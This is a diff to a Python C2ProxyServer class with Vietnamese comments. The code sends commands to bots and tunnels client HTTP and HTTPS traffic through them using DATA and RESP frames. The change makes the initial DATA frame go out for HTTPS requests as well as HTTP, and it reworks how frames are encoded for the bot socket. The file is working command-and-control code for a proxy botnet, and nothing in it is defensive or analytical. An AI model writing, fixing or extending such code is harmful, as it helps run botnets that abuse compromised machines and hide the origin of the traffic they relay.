@@ -840,12 +840,12 @@ class C2ProxyServer:
             print(f"📤 Sending to bot {bot_id}: {command.strip()}")
             bot_socket.sendall(command.encode())
 
-            # Gửi frame DATA đầu tiên (nếu là HTTP)
-            if not connection['is_https'] and request_data:
-                print(f"📤 Sending initial DATA frame to bot {bot_id} for HTTP request")
+            # Gửi frame DATA đầu tiên (cho cả HTTP và HTTPS)
+            if request_data:
+                print(f"📤 Sending initial DATA frame to bot {bot_id} for {'HTTPS' if connection['is_https'] else 'HTTP'} request")
                 self._send_data_frame_to_bot(bot_socket, connection_id, request_data)
             else:
-                print(f"⚠️  Not sending DATA frame: is_https={connection['is_https']}, has_data={bool(request_data)}")
+                print(f"⚠️  No request data to send to bot")
 
             # Bắt đầu 2 chiều: client->bot (DATA frames) và bot->client (RESP frames)
             threading.Thread(target=self._pump_client_to_bot, args=(connection_id,), daemon=True).start()
@@ -892,8 +892,15 @@ class C2ProxyServer:
                 print(f"⚠️  Bot socket closed for connection {connection_id}")
                 return
                 
-            header = f"DATA:{connection_id}:\n".encode()
-            bot_socket.sendall(header + payload_bytes)
+            # Convert binary data to string for transmission
+            if isinstance(payload_bytes, bytes):
+                payload_str = payload_bytes.decode('latin1')
+            else:
+                payload_str = payload_bytes
+                
+            header = f"DATA:{connection_id}:{payload_str}\n"
+            bot_socket.sendall(header.encode('latin1'))
+            print(f"📤 Sent DATA frame: {len(payload_str)} bytes")
         except Exception as e:
             print(f"❌ Error sending DATA frame to bot {connection_id}: {e}")
 
